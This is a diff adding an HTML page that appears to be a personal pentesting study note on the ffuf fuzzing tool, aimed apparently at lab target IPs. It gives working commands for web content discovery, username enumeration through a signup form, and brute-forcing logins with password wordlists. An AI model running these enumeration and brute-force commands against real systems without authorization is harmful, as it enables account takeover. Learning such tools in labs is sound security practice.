@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>ffuf</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>ffuf</h1><br/><p>Web Content Discovery Tool.  Uses the “FUZZ” keyword</p><p></p><p>ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u <a href="http://10.10.89.149/FUZZ">http://10.10.89.149/FUZZ</a></p><p></p><p></p><p></p><p><img src="images/74-1.png" alt="images/74-1.png" /></p><p></p><p><strong></strong></p><p><strong>Searching For Virtual Hosts</strong></p><p></p><p>Note: The fs {Size} parameter can be found by running once without it. Then the no result size should be excluded using the -fs filter.</p><p><img src="images/74-2.png" alt="images/74-2.png" /></p><p></p><p><strong>Output</strong></p><p></p><p><img src="images/74-3.png" alt="images/74-3.png" /></p><p></p><p></p><p><strong>Username Emuneration with ffuf:</strong></p><p></p><p>ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d &quot;username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u <a href="http://10.10.226.40/customers/signup">http://10.10.226.40/customers/signup</a> -mr &quot;username already exists&quot;</p><p></p><p>Note: -H “Content-Type: application/x-www-form-urlencoded”</p><p></p><p></p><p><img src="images/74-4.png" alt="images/74-4.png" /></p><p></p><p></p><p><strong>Brute Forcing Known Usernames &amp; Password wordlists(Using Custom Variables W1 &amp; W2:</strong></p><p></p><p>ffuf -w valid_usernames.txt:W1,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2  -X POST -d &quot;username=W1&amp;password=W2&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u <a href="http://10.10.226.40/customers/login">http://10.10.226.40/customers/login</a> -fc 200</p><p></p><p><img src="images/74-5.png" alt="images/74-5.png" /></p></div>
+</body>
+</html>
